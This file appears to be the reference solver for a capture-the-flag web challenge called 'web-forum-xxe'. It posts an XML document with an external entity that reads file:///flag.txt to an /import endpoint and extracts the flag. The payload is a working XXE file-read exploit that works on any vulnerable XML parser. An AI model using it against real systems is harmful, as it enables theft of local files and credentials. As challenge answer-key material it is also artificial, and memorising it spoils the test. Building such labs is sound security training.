#!/usr/bin/env python3
"""Reference solver for web-forum-xxe.

The importer resolves external SYSTEM entities. Declare a file:// entity for
/flag.txt and reference it.

    python3 solve.py http://HOST:PORT
"""
import json
import re
import sys
import urllib.request


def solve(base):
    base = base.rstrip("/")
    xml = (
        '<?xml version="1.0"?>'
        '<!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag.txt">]>'
        "<r>&x;</r>"
    )
    req = urllib.request.Request(
        base + "/import", data=xml.encode(), headers={"Content-Type": "application/xml"}
    )
    parsed = json.loads(urllib.request.urlopen(req, timeout=10).read())["parsed"]
    m = re.search(r"NCTF\{[^}]*\}", parsed)
    return m.group(0) if m else parsed


if __name__ == "__main__":
    if len(sys.argv) != 2:
        raise SystemExit("usage: solve.py http://HOST:PORT")
    print(solve(sys.argv[1]))
